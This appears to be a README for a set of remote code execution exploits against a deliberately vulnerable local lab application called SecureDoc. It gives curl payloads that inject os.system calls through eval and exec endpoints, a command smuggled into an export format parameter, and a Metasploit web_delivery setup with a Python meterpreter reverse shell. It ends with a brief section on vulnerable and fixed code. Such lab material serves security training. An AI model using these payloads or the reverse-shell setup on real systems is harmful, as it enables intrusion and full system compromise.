# SecureDoc RCE Exploits

## Overview
Remote Code Execution via eval(), exec(), and subprocess in SecureDoc.

## Target Application
- **App**: SecureDoc
- **Port**: 5000
- **Vulnerability**: Multiple RCE vectors
- **Severity**: CRITICAL

## Available Exploits

### 1. eval_rce.py
RCE via eval() in document processing.

### 2. exec_rce.py
RCE via exec() in admin functions.

### 3. web_delivery.rb
Metasploit web delivery module.

**Usage**:
```bash
python eval_rce.py http://localhost:5000
python exec_rce.py http://localhost:5000

# Metasploit
msfconsole
use exploit/multi/script/web_delivery
set TARGET 1
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST <your-ip>
set SRVHOST 0.0.0.0
exploit
```

## Exploitation Examples

```bash
# eval() RCE
curl -X POST http://localhost:5000/api/calculate \
  -d "expression=__import__('os').system('id')"

# exec() RCE
curl -X POST http://localhost:5000/admin/execute \
  -d "code=import os;os.system('whoami')"

# subprocess RCE
curl http://localhost:5000/document/export?format=pdf;id
```

## Testing Steps

1. **Start SecureDoc**:
```bash
cd ../../projects/securedoc
docker-compose up -d
```

2. **Test RCE**:
```bash
python eval_rce.py http://localhost:5000
```

## Defense

**Vulnerable**:
```python
# NEVER use eval/exec on user input!
result = eval(user_expression)
exec(user_code)
os.system(f"convert {user_file}")
```

**Fixed**:
```python
# Use safe alternatives
from ast import literal_eval
result = literal_eval(user_expression)  # Only literals

# Never allow arbitrary code execution
# Use specific, validated operations instead
```

## Notes
**WARNING**: RCE allows complete system compromise.

## Related
- See `../../adminpanel/rce/` for more RCE techniques
- See `../../dataviz/rce/` for eval/pickle RCE

## References
- Eval/Exec Dangers: https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html
- Command Injection: https://owasp.org/www-community/attacks/Command_Injection
